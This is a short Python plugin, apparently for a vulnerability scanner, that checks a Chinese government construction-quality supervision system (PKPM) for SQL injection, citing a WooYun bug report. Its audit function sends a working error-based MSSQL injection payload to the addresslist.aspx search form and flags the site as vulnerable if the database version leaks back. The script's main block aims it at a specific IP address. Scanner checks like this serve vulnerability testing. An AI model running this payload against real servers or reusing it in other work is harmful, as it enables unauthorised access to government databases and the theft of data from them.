#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:浩子
#Name:政府建设工程质量监督系统某处注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0120366

def assign(service,arg):
    if service=="pkpmbs":
        return True,arg 
    


def  audit(arg):
    hz= "userService/addresslist.aspx"
    post="keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit3=%E6%90%9C%E3%80%80%E7%B4%A2"
    url=arg +hz
    code,head,res,errcode,_=curl.curl2(url,post)
    if code!=0 and  "GAOJIMicrosoft" in res:  
            security_hole(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('pkpmbs','http://218.7.239.170:81/')[1])